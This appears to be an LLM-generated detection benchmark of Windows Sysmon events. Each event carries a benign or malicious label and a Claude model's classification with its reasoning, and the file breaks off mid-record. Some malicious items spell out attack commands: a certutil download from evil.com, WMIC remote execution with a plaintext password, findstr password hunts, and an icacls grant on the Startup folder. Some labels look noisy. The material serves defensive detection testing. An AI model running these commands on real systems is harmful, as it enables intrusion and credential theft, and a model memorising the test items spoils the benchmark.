{"EventID": 1, "EventTime": "2020-05-01 22:56:48", "UtcTime": "2020-05-01T22:56:48.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding", "ProcessId": "4328", "ProcessGUID": "{6bbf237a-10e8-5eac-10e8-0000000010e8}", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": "912", "ParentProcessGUID": "{6bbf237a-0390-5eac-0390-000000000390}", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:48] | PID=4328 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe | Parent=C:\\Windows\\System32\\svchost.exe | CMD=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "WmiPrvSE.exe (WMI Provider Host) launched by svchost.exe with standard -Embedding parameter is normal Windows system behavior for WMI service operations.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-11-05 09:47:50", "UtcTime": "2025-11-05T09:47:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe", "CommandLine": "\"C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe\"", "ProcessId": "9012", "ProcessGUID": "{9016def0-6023-905b-2c3e-ca449c9f2888}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\Docker\\Docker", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-11-05 09:47:50] | PID=9012 | User=CORP\\jsmith | Image=C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Docker Desktop application launched by Windows Explorer under normal user context - standard legitimate software execution.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:18", "UtcTime": "2020-05-01T22:56:18.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"whoami > C:\\Users\\Public\\whoami.txt\\\"\"", "ProcessId": "1112", "ProcessGUID": "{6bbf237a-0458-5eac-0458-000000000458}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1048", "ParentProcessGUID": "{6bbf237a-0418-5eac-0418-000000000418}", "ParentCommandLine": "cmd.exe /c wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"whoami > C:\\Users\\Public\\whoami.txt\\\"\"", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:18] | PID=1112 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\wbem\\wmic.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"whoami > C:\\Users\\Public\\whoami.txt\\\"\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC used for remote process execution on DESKTOP-TARGET to run PowerShell command that dumps user context to a file in a public directory - clear lateral movement and reconnaissance pattern.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2020-05-01 22:58:12", "UtcTime": "2020-05-01T22:58:12.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c wmic /node:192.168.1.150 /user:DMEVALS\\pbeesly /password:Password123! process call create \"C:\\Windows\\System32\\calc.exe\"", "ProcessId": "8440", "ProcessGUID": "{6bbf237a-20f8-5eac-20f8-0000000020f8}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1564", "ParentProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:58:12] | PID=8440 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c wmic /node:192.168.1.150 /user:DMEVALS\\pbeesly /password:Password123! process call create \"C:\\Windows\\System32\\calc.exe\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC command with hardcoded credentials executing remote process on another system (192.168.1.150) - clear lateral movement pattern with exposed password in command line.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2025-10-27 10:22:31", "UtcTime": "2025-10-27T10:22:31.123Z", "Hostname": "WORKSTATION-02.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir C:\\Users", "ProcessId": "5216", "ProcessGUID": "{7c2e8a5b-3b9c-5eac-1000-000000000500}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1420", "ParentProcessGUID": "{6a9d1c4f-9b5a-5eac-1000-000000000400}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jdoe", "Domain": "CORP", "AccountName": "jdoe", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jdoe\\", "LogonId": "0x1a4b", "_label": "benign", "_source": "llm", "prompt": "[2025-10-27 10:22:31] | PID=5216 | User=CORP\\jdoe | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c dir C:\\Users", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing a simple directory listing command via cmd.exe spawned from explorer.exe - standard user activity with no suspicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/image.jpg C:\\temp\\image.jpg", "ProcessId": "1792", "ProcessGUID": "{6bbf237a-0700-5eac-0700-000000000700}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "432", "ParentProcessGUID": "{6bbf237a-01b0-5eac-01b0-0000000001b0}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=1792 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\certutil.exe | Parent=C:\\Windows\\explorer.exe | CMD=certutil.exe -urlcache -split -f http://evil.com/image.jpg C:\\temp\\image.jpg", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Certutil being used to download a file from a suspicious domain (evil.com) to temp directory - classic LOTL technique for payload delivery. The NETWORK SERVICE account context and explorer.exe parent process are also suspicious.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 12, "EventTime": "2025-10-09 15:36:40", "UtcTime": "2025-10-09T15:36:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "8956", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000405}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\regedit.exe", "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "EventType": "Key Create", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:40] | PID=8956 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\regedit.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Registry Editor (regedit.exe) launched by a domain user from its legitimate system location without suspicious command-line arguments. This is standard administrative activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-10 08:04:50", "UtcTime": "2025-10-10T08:04:50.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe", "ProcessId": "2015", "ProcessGUID": "{12345678-1234-5678-1234-567812340019}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "SourcePort": "50004", "DestinationIp": "40.74.178.116", "DestinationPort": "443", "DestinationHostname": "vscode.blob.core.windows.net", "Protocol": "tcp", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:50] | PID=2015 | User=WORKSTATION\\user | Image=C:\\Program Files\\Microsoft VS Code\\Code.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Visual Studio Code (VS Code) running from its standard installation directory under a normal user account - typical legitimate development activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:40", "UtcTime": "2020-05-01T22:57:40.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /spin \"password\" *.*", "ProcessId": "1278", "ProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1267", "ParentProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:40] | PID=1278 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /spin \"password\" *.*", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using findstr to recursively search all files for \"password\" strings is a classic credential discovery technique used to find stored passwords in configuration files, scripts, or documents.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 12, "EventTime": "2025-10-10 08:00:50", "UtcTime": "2025-10-10T08:00:50.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2003", "ProcessGUID": "{12345678-1234-5678-1234-567812340004}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\regedit.exe", "TargetObject": "HKEY_CURRENT_USER\\Software\\TestKey", "EventType": "Key Create", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:50] | PID=2003 | User=WORKSTATION\\user | Image=C:\\Windows\\System32\\regedit.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Registry Editor (regedit.exe) launched by a standard user account without suspicious command-line parameters or context indicating malicious registry manipulation.", "confidence": "medium", "attack_technique": ""}}
{"EventID": 13, "EventTime": "2025-11-03 16:24:35", "UtcTime": "2025-11-03T16:24:35.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "7890", "ProcessGUID": "{7894abcd-4ef0-7839-0a1c-a8227a7d0666}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\msedge.exe", "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Edge\\DefaultSettings\\AllowSyncXHRInPageDismissal", "EventType": "SetValue", "_label": "benign", "_source": "llm", "prompt": "[2025-11-03 16:24:35] | PID=7890 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msedge.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Edge browser process running under a standard corporate user account - normal web browsing activity with no suspicious command-line arguments or behaviors.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:15", "UtcTime": "2020-05-01T22:56:15.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "ProcessId": "1236", "ProcessGUID": "{6bbf237a-04d4-5eac-04d4-0000000004d4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1111", "ParentProcessGUID": "{6bbf237a-0457-5eac-0457-000000000457}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:15] | PID=1236 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Registry query targeting Winlogon key which contains sensitive authentication and credential information, often used for credential discovery or persistence reconnaissance.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:20", "UtcTime": "2025-10-10T08:00:20.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Notepad++\\notepad++.exe", "CommandLine": "C:\\Program Files\\Notepad++\\notepad++.exe C:\\Users\\user\\test.txt", "ProcessId": "2002", "ProcessGUID": "{12345678-1234-5678-1234-567812340003}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340001}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:20] | PID=2002 | User=WORKSTATION\\user | Image=C:\\Program Files\\Notepad++\\notepad++.exe | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\Notepad++\\notepad++.exe C:\\Users\\user\\test.txt", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User opening a text file with Notepad++ launched from Windows Explorer - standard desktop activity with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:00", "UtcTime": "2025-10-10T08:03:00.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Git\\bin\\bash.exe", "CommandLine": "C:\\Program Files\\Git\\bin\\bash.exe", "ProcessId": "2010", "ProcessGUID": "{12345678-1234-5678-1234-567812340014}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "2000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340000}", "ParentCommandLine": "cmd.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:00] | PID=2010 | User=WORKSTATION\\user | Image=C:\\Program Files\\Git\\bin\\bash.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=C:\\Program Files\\Git\\bin\\bash.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Git bash being launched from cmd.exe is normal developer activity. This is a legitimate use case for developers working with Git version control on Windows.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-10 08:00:10", "UtcTime": "2025-10-10T08:00:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Chrome\\chrome.exe", "ProcessId": "6789", "ProcessGUID": "{8cda359b-dbe0-5eaf-1000-000000000600}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "54321", "DestinationIp": "8.8.8.8", "DestinationPort": "53", "DestinationHostname": "dns.google", "Protocol": "UDP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:10] | PID=6789 | User=CORP\\jsmith | Image=C:\\Program Files\\Chrome\\chrome.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Chrome browser execution by a domain user - standard web browsing activity with no suspicious command-line arguments or unusual context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-09 15:36:45", "UtcTime": "2025-10-09T15:36:45.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Git\\bin\\bash.exe", "CommandLine": "\"C:\\Program Files\\Git\\bin\\bash.exe\"", "ProcessId": "9067", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000406}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4512", "ParentProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentCommandLine": "cmd.exe /c dir C:\\Users", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:45] | PID=9067 | User=CORP\\jsmith | Image=C:\\Program Files\\Git\\bin\\bash.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=\"C:\\Program Files\\Git\\bin\\bash.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Git Bash launched from cmd.exe by a domain user - typical developer workflow for version control operations and command-line tasks.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:56", "UtcTime": "2020-05-01T22:55:56.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\icacls.exe", "CommandLine": "icacls C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup /grant Everyone:(OI)(CI)F", "ProcessId": "1234", "ProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "456", "ParentProcessGUID": "{6bbf237a-01c8-5eac-01c8-0000000001c8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "permission_manipulation", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:56] | PID=1234 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\icacls.exe | Parent=C:\\Windows\\explorer.exe | CMD=icacls C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup /grant Everyone:(OI)(CI)F", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "icacls is granting full control permissions to Everyone on the Startup folder, a common persistence technique to allow any user to place malicious executables that will run at boot. The NETWORK SERVICE account executing this is highly suspicious.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:00", "UtcTime": "2025-10-10T08:03:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\taskhostw.exe", "CommandLine": "taskhostw.exe {CCAB0EE3-E137-479D-8141-A782727874D3}", "ProcessId": "8901", "ProcessGUID": "{2355c0a5-198b-5eba-1000-000000001100}", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": "123", "ParentProcessGUID": "{3466d1b6-2a9c-5ebb-1000-000000001200}", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "System", "CurrentDirectory": "C:\\Windows\\system32\\", "LogonId": "0x3e4", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:00] | PID=8901 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\taskhostw.exe | Parent=C:\\Windows\\System32\\svchost.exe | CMD=taskhostw.exe {CCAB0EE3-E137-479D-8141-A782727874D3}", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Taskhostw.exe running as SYSTEM with parent svchost.exe is normal Windows task scheduling behavior. The GUID parameter indicates legitimate scheduled task execution.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-10 08:02:20", "UtcTime": "2025-10-10T08:02:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\msedge.exe", "ProcessId": "1678", "ProcessGUID": "{38caef33-b1c7-0a66-1c00-000000001000}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "49153", "DestinationIp": "93.184.216.34", "DestinationPort": "443", "DestinationHostname": "example.com", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:20] | PID=1678 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msedge.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Edge browser process running under a normal corporate user account - standard web browsing activity with no suspicious command-line parameters.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:30", "UtcTime": "2025-10-10T08:02:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe", "CommandLine": "\"C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe\"", "ProcessId": "1789", "ProcessGUID": "{49db0044-c2d8-1b77-1d00-000000001100}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\Docker\\Docker\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:30] | PID=1789 | User=CORP\\jsmith | Image=C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Docker Desktop application launched by user jsmith from Windows Explorer - normal application startup behavior with legitimate parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-25 21:10:50", "UtcTime": "2025-10-25T21:10:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Wireshark\\Wireshark.exe", "ProcessId": "4567", "ProcessGUID": "{4561789a-1bcd-4506-d789-7599474a7333}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "50000", "DestinationIp": "172.217.160.142", "DestinationPort": "443", "DestinationHostname": "www.google.com", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-25 21:10:50] | PID=4567 | User=CORP\\jsmith | Image=C:\\Program Files\\Wireshark\\Wireshark.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Wireshark network analyzer being launched from its standard installation directory by a domain user - legitimate network troubleshooting or monitoring activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:52", "UtcTime": "2020-05-01T22:55:52.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /si password *.xml *.config *.txt", "ProcessId": "1245", "ProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:52] | PID=1245 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /si password *.xml *.config *.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using findstr to search for passwords in configuration and text files is a classic credential discovery technique used by attackers to find stored credentials.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:40", "UtcTime": "2020-05-01T22:57:40.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\temp.ps1", "ProcessId": "2530", "ProcessGUID": "{6bbf237a-09e2-5eac-09e2-0000000009e2}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "2520", "ParentProcessGUID": "{6bbf237a-09d8-5eac-09d8-0000000009d8}", "ParentCommandLine": "cmd.exe /c C:\\Users\\Public\\temp.bat", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:40] | PID=2530 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\temp.ps1", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell executed by NETWORK SERVICE account with execution policy bypass from suspicious location (C:\\Users\\Public\\). This indicates potential compromise or malicious script execution from a writable public directory.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:50", "UtcTime": "2020-05-01T22:56:50.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /spin \"password\" *.*", "ProcessId": "1278", "ProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1267", "ParentProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:50] | PID=1278 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /spin \"password\" *.*", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using findstr to recursively search all files for \"password\" strings is a classic credential discovery technique used by attackers to locate stored passwords in 